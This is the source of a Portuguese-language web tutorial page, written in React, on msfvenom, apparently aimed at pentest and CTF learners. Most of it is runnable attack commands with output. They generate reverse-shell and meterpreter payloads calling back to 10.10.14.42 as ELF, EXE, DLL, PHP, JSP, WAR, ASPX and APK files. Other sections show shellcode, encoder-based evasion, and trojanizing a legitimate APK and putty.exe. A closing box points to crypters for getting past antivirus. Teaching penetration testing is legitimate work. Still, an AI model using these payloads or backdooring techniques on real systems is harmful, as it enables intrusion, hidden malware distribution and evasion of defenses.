import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Msfvenom() {
  return (
    <PageContainer
      title="msfvenom — Gerador de payloads"
      subtitle="Cria binários reversos para Linux/Windows/PHP/JSP/aspx, encoders, formatos de saída."
      difficulty="intermediário"
      timeToRead="14 min"
      prompt="exploit/msfvenom"
    >
      <h2>Anatomia</h2>
      <p>
        O <code>msfvenom</code> combina o gerador (<code>msfpayload</code>) e o codificador
        (<code>msfencode</code>) num único binário. Sintaxe geral:
      </p>

      <OutputBlock label="estrutura do comando" type="muted">
{`msfvenom -p <PAYLOAD> [opções de payload] -f <FORMATO> -o <ARQUIVO_SAIDA>
              ↑                              ↑
              tipo de shell           binário/script gerado`}
      </OutputBlock>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -l payloads | head -10",
            out: `Framework Payloads (623 total) [--payload <value>]
==================================================

   Name                                                 Description
   ----                                                 -----------
   aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
   aix/ppc/shell_find_port                             Spawn a shell on an established connection
   aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
   android/meterpreter/reverse_http
   android/meterpreter/reverse_https
   android/meterpreter/reverse_tcp
   android/shell/reverse_tcp`,
            outType: "info",
          },
          {
            cmd: "msfvenom -l formats | head",
            out: `Framework Executable Formats [--format <value>]
================================================
asp, aspx, aspx-exe, axis2, dll, ducky-script-psh, elf, elf-so,
exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs,
macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection,
python-reflection, vba, vba-exe, vba-psh, vbs, war`,
            outType: "default",
          },
        ]}
      />

      <h2>Payloads mais usados</h2>
      <CommandTable
        title="Cheatsheet por situação"
        variations={[
          { cmd: "linux/x64/meterpreter/reverse_tcp", desc: "Linux 64-bit, meterpreter reverso TCP.", output: "Mais comum em Linux." },
          { cmd: "linux/x86/shell_reverse_tcp", desc: "Linux 32-bit, shell crua.", output: "Para alvos antigos." },
          { cmd: "windows/x64/meterpreter/reverse_tcp", desc: "Windows 64, meterpreter.", output: "Padrão hoje." },
          { cmd: "windows/x64/meterpreter/reverse_https", desc: "Mesma coisa via HTTPS.", output: "Atravessa proxies, parece web." },
          { cmd: "windows/x64/shell_reverse_tcp", desc: "cmd.exe puro reverso.", output: "Quando meterpreter morre." },
          { cmd: "php/meterpreter_reverse_tcp", desc: "PHP shell embutido.", output: "Para web pentest." },
          { cmd: "php/reverse_php", desc: "PHP reverso bash-like.", output: "1-liner em PHP." },
          { cmd: "java/jsp_shell_reverse_tcp", desc: "JSP para Tomcat/JBoss.", output: "Para Java app servers." },
          { cmd: "windows/x64/exec CMD=...", desc: "Executa comando direto.", output: "Sem callback, fire-and-forget." },
          { cmd: "cmd/unix/reverse_bash", desc: "Bash one-liner reverso.", output: "Não precisa msf no alvo." },
          { cmd: "android/meterpreter/reverse_tcp", desc: "APK com meterpreter.", output: "Para mobile pentest." },
        ]}
      />

      <h2>Linux ELF reverso</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf -o payload.elf",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 119 bytes
Final size of elf file: 239 bytes
Saved as: payload.elf`,
            outType: "success",
          },
          {
            cmd: "ls -la payload.elf && file payload.elf",
            out: `-rw-r--r-- 1 wallyson wallyson 239 Apr  3 13:42 payload.elf
payload.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header`,
            outType: "info",
          },
          {
            comment: "no atacante: listener antes de executar",
            cmd: "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.14.42; set LPORT 4444; exploit'",
            out: `[*] Started reverse TCP handler on 10.10.14.42:4444 `,
            outType: "muted",
          },
          {
            comment: "no alvo: chmod + executa",
            cmd: "chmod +x payload.elf && ./payload.elf",
            out: "(silencioso. callback abre no listener)",
            outType: "warning",
          },
        ]}
      />

      <h2>Windows EXE</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.42 LPORT=8443 -f exe -o update.exe",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: update.exe`,
            outType: "success",
          },
          {
            comment: "service exe (instala como serviço Windows)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f exe-service -o svc.exe",
            out: "Saved as: svc.exe (formato instalável via sc create)",
            outType: "default",
          },
          {
            comment: "DLL para hijacking",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f dll -o evil.dll",
            out: "Final size of dll file: 8704 bytes",
            outType: "default",
          },
        ]}
      />

      <h2>Web shells</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f raw -o shell.php",
            out: `Saved as: shell.php`,
            outType: "muted",
          },
          {
            cmd: "head -1 shell.php",
            out: `<?php /**/ error_reporting(0); $ip = '10.10.14.42'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { ...`,
            outType: "info",
          },
          {
            comment: "muito comum: shell PHP de 1 linha (mais simples que meterpreter PHP)",
            cmd: "msfvenom -p php/reverse_php LHOST=10.10.14.42 LPORT=4444 -f raw -o rev.php",
            out: "Saved as: rev.php",
            outType: "default",
          },
          {
            comment: "JSP para Tomcat",
            cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f raw -o shell.jsp",
            out: "Saved as: shell.jsp",
            outType: "default",
          },
          {
            comment: "WAR (Tomcat manager → /manager/html upload)",
            cmd: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war -o shell.war",
            out: "Final size of war file: 1109 bytes",
            outType: "default",
          },
          {
            comment: "ASPX para IIS",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f aspx -o shell.aspx",
            out: "Saved as: shell.aspx",
            outType: "default",
          },
        ]}
      />

      <h2>Encoders & evasão</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -l encoders | head -10",
            out: `Framework Encoders [--encoder <value>]
=======================================

  Name                                                  Rank       Description
  ----                                                  ----       -----------
  cmd/base64                                            good       Base64 Command Encoder
  cmd/echo                                              good       Echo Command Encoder
  cmd/generic_sh                                        manual     Generic Shell Variable Substitution Command Encoder
  cmd/perl                                              normal     Perl Command Encoder
  generic/none                                          normal     The "none" Encoder
  x64/xor                                               normal     XOR Encoder
  x64/xor_dynamic                                       normal     Dynamic key XOR Encoder
  x86/shikata_ga_nai                                    excellent  Polymorphic XOR Additive Feedback Encoder`,
            outType: "info",
          },
          {
            comment: "encoder shikata_ga_nai com 10 iterações (clássico)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o payload_enc.exe",
            out: `Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 743 (iteration=0)
x64/xor_dynamic succeeded with size 778 (iteration=1)
[...]
x64/xor_dynamic succeeded with size 1043 (iteration=9)
Saved as: payload_enc.exe`,
            outType: "success",
          },
          {
            comment: "evitar bytes específicos (ex: \\x00 em buffer overflow)",
            cmd: "msfvenom -p linux/x64/exec CMD='id' -b '\\x00\\x0a\\x0d' -f c",
            out: `unsigned char buf[] = 
"\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\\x48\\xbf\\x2f\\x2f\\x62\\x69"
"\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\\x5f\\xb0\\x3b"
"\\x0f\\x05";`,
            outType: "info",
          },
        ]}
      />

      <h2>Formato shellcode (-f c, -f python, -f hex)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p linux/x64/exec CMD='/bin/sh' -f python -v shellcode",
            out: `shellcode =  b""
shellcode += b"\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f"
shellcode += b"\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50"
shellcode += b"\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05"`,
            outType: "default",
          },
          {
            cmd: "msfvenom -p windows/x64/exec CMD=calc.exe -f c -v sc",
            out: `unsigned char sc[] = 
"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50"
"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52"
[...]
"\\x6c\\x6c\\x00\\x32\\x69\\x65\\x73\\x68";`,
            outType: "default",
          },
          {
            comment: "hex puro para colar em payloads de exploração",
            cmd: "msfvenom -p linux/x64/exec CMD='id' -f hex",
            out: "4831ff5757565a48bf2f2f62696e2f7368...",
            outType: "muted",
          },
        ]}
      />

      <h2>APK Android</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -o evil.apk",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10247 bytes
Saved as: evil.apk`,
            outType: "warning",
          },
          {
            comment: "embedar em um APK existente (mais discreto)",
            cmd: "msfvenom -x app_legitimo.apk -p android/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -o app_trojanizado.apk",
            out: `[*] Backdooring APK file...
[*] Decompiling original APK...
[*] Decompiling payload APK...
[*] Adding our payload to the original APK...
[*] Re-compiling APK...
[*] Signing APK with default keystore...
Saved as: app_trojanizado.apk`,
            outType: "error",
          },
        ]}
      />

      <h2>Templates customizados (-x)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "esconder payload dentro de putty.exe legítimo",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o putty_evil.exe",
            out: `Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x64/xor_dynamic
[...]
Final size of exe file: 1167872 bytes
Saved as: putty_evil.exe`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Reverse shell completo: payload + listener + execução"
        goal="Gerar payload Linux ELF, subir listener e executar — tudo localmente para validar."
        steps={[
          "Gere o payload com msfvenom.",
          "Em uma janela: suba o handler no msfconsole.",
          "Em outra janela: execute o payload (no mesmo Kali, simulando o alvo).",
          "Confirme session e id.",
        ]}
        command={`# 1) gerar
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/test.elf
chmod +x /tmp/test.elf

# 2) handler (janela 1)
msfconsole -q -x "
use exploit/multi/handler;
set payload linux/x64/meterpreter/reverse_tcp;
set LHOST 127.0.0.1;
set LPORT 4444;
exploit"

# 3) executar (janela 2)
/tmp/test.elf`}
        expected={`[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3045348 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:42718)

meterpreter > getuid
Server username: wallyson @ kali
meterpreter > sysinfo
Computer    : kali
OS          : Debian 13 (Linux 6.10.6-amd64)
Architecture: x64
Meterpreter : x64/linux`}
        verify="Limpe depois: kill no msfconsole, rm /tmp/test.elf."
      />

      <AlertBox type="warning" title="AVs detectam">
        Payloads padrão do msfvenom têm assinatura conhecida — Defender, CrowdStrike, ESET
        pegam todos. Para testes reais use <strong>obfuscation</strong> (página dedicada),
        <strong> crypters</strong>, técnicas de reflective DLL injection. Em CTF/THM/HTB
        funcionam direto porque os alvos não têm AV moderno.
      </AlertBox>
    </PageContainer>
  );
}
